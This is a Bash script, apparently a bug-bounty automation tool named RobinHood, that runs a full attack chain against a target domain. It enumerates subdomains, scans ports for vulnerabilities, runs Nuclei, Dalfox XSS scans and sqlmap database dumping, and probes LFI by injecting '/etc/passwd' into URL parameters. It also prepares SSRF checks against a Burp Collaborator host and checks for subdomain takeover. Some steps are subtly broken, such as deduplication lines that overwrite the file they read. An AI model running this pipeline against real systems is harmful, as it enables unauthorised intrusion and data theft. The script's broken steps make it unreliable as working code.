#!/usr/bin/env bash

## RobinHood - Bug Hunting automation script for dreamers and low-hanging fruits 
## https://github.com/CalfCrusher

## Usage: Run in background mod with: nohup ./RobinHood.sh LARGE_SCOPE_DOMAIN OUT_OF_SCOPE_LIST 2>&1 &
## Esample: nohup ./RobinHood.sh example.com vpn.example.com,test.example.com 2>&1 &

# Save starting execution time
start=`date +%s`

echo ''
echo 'RobinHood - Bug Hunting automation script for dreamers and low-hanging fruits'
echo ''
echo 'Running..'

# Save locations of tools and file
BURP_COLLAB_URL="" # Burp Collaborator (EDIT THIS)
FINGERPRINTS="" # Subjack fingerprints location (EDIT THIS)
CLOUDFLAIR="" # CloudFlair tool location (EDIT THIS)
CENSYS_API_ID="" # Censys api id for CloudFlair(EDIT THIS)
CENSYS_API_SECRET="" # Censys api secret for CloudFlir (EDIT THIS)
VULSCAN_NMAP_NSE="" # Vulscan NSE script for Nmap (EDIT THIS)
JSUBFINDER_SIGN="" # Signature location for jsubfinder (EDIT THIS)
NUCLEI_TEMPLATES="" # Directory templated for Nuclei (EDIT THIS)

SUBFINDER=$(command -v subfinder)
AMASS=$(command -v amass)
SUBLIST3R=$(command -v sublist3r)
HTTPX=$(command -v httpx)
GF=$(command -v gf)
GAU=$(command -v gau)
DALFOX=$(command -v dalfox)
QSREPLACE=$(command -v qsreplace)
SUBJACK=$(command -v subjack)
GOWITNESS=$(command -v gowitness)
JSUBFINDER=$(command -v jsubfinder)
NUCLEI=$(command -v nuclei)
SQLMAP=$(command -v sqlmap)
NMAP=$(command -v nmap)

# Get large scope domain as first argument
HOST=$1

# Get list of excluded subdomains as second argument
OUT_OF_SCOPE_SUBDOMAINS=$2

# Subdomains Enumeration
$SUBLIST3R -d $HOST -o subdomains_$HOST.txt
$SUBFINDER -d $HOST -silent | awk -F[ ' {print $1}' | tee -a subdomains_$HOST.txt
$AMASS enum -passive -d $HOST | tee -a subdomains_$HOST.txt

# Remove duplicated subdomains
cat subdomains_$HOST.txt | $QSREPLACE -a | tee subdomains_$HOST.txt

# Exclude out of scope subdomains
if [ ! -z "$OUT_OF_SCOPE_SUBDOMAINS" ]
then
    set -f
    array=(${OUT_OF_SCOPE_SUBDOMAINS//,/ })
    for i in "${!array[@]}"
    do
            subdomain="${array[i]}"
            sed -i "/$subdomain/d" ./subdomains_$HOST.txt
    done
fi

# Check live subdomains
cat subdomains_$HOST.txt | $HTTPX -silent | tee live_subdomains_$HOST.txt

# Scan with NMAP and Vulners
if [ ! -z "$VULSCAN_NMAP_NSE" ]
then
    $NMAP -Pn -sV -oN nmap_results_$HOST.txt -iL subdomains_$HOST.txt --script=$VULSCAN_NMAP_NSE -T2 --top-ports 1000
    sed -i '/Failed to resolve/d' nmap_results_$HOST.txt # Remove lines fronm log for those subs that aren't up
fi

# Get screenshots of subdomains
$GOWITNESS file -f live_subdomains_$HOST.txt

# Search for secrets
$JSUBFINDER search -f live_subdomains_$HOST.txt -s jsubfinder_secrets_$HOST.txt

# Get URLs with gau
cat live_subdomains_$HOST.txt | $GAU --mc 200 | tee live_urls_$HOST.txt

# Run Nuclei on live subdomains
if [ ! -z "$NUCLEI_TEMPLATES" ]
then
    $NUCLEI -silent -t $NUCLEI_TEMPLATES -list live_subdomains_$HOST.txt -timeout 10 -rl 10 -bs 5 -c 5 -hc 2 -o nuclei_results_$HOST.txt
fi

# Extract cloudflare protected hosts from nuclei output
cat nuclei_results_$HOST.txt | grep ":cloudflare" | awk '{print $(NF)}' | sed -E 's/^\s*.*:\/\///g' | sed 's/\///'g | tee cloudflare_hosts_$HOST.txt

# Remove duplicates
cat cloudflare_hosts_$HOST.txt | $QSREPLACE -a | tee cloudflare_hosts_$HOST.txt

# Try to get origin ip using SSL certificate (cloudflair and censys) YOU NEED YOUR API KEYS!
if [ ! -z "$CENSYS_API_ID" ]
then
    while IFS='' read -r DOMAIN || [ -n "${DOMAIN}" ]; do
        python3.9 $CLOUDFLAIR $DOMAIN --censys-api-id $CENSYS_API_ID --censys-api-secret $CENSYS_API_SECRET | tee -a origin_$HOST.txt
        sleep 15
    done < cloudflare_hosts_$HOST.txt
fi

# Extract urls with possible XSS params
cat live_urls_$HOST.txt | $GF xss > xss_urls_$HOST.txt
# Remove duplicates
cat xss_urls_$HOST.txt | $QSREPLACE -a | tee xss_urls_$HOST.txt

# Extract urls with possible SQLi params
cat live_urls_$HOST.txt | $GF sqli > sqli_urls_$HOST.txt
# Remove duplicates
cat sqli_urls_$HOST.txt | $QSREPLACE -a | tee sqli_urls_$HOST.txt

# Extract urls with possible LFI params
cat live_urls_$HOST.txt | $GF lfi > lfi_urls_$HOST.txt
# Remove duplicates
cat lfi_urls_$HOST.txt | $QSREPLACE -a | tee lfi_urls_$HOST.txt

# Extract urls with possible SSRF params
cat live_urls_$HOST.txt | $GF ssrf > ssrf_urls_$HOST.txt
# Remove duplicates
cat ssrf_urls_$HOST.txt | $QSREPLACE -a | tee ssrf_urls_$HOST.txt

# Run Dalfox on XSS urls
echo "Running DALFOX.."
$DALFOX file xss_urls_$HOST.txt -w 10 -S -o dalfox_XSS_$HOST.txt

# Run SQLMAP on SQLi urls
$SQLMAP -m sqli_urls_$HOST.txt --batch --random-agent --dbs -o sqlmap_$HOST

# Test basic LFI vulnerability
cat lfi_urls_$HOST.txt | $QSREPLACE "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -sk "%" 2>&1 | grep -q "root:x" && echo "VULNERABLE! %"' | tee lfi_vulnerable_urls_$HOST.txt

# Test for basic SSRF using Burp Collaborator
if [ ! -z "$BURP_COLLAB_URL" ]
then
    cat ssrf_urls_$HOST.txt | grep "=" | $QSREPLACE $BURP_COLLAB_URL
fi

# Search for subdomains takeover
if [ ! -z "$FINGERPRINTS" ]
then
    $SUBJACK -w subdomains_$HOST.txt -t 50 -timeout 25 -o sub_takeover_$HOST.txt -ssl -c $FINGERPRINTS -v
fi

# Save finish execution time
end=`date +%s`
echo ''
echo "********* COMPLETED ! *********"
echo ''
echo "Fork it on https://github.com/CalfCrusher/RobinHood and make the world a better place"
echo ''
echo Execution time was `expr $end - $start` seconds
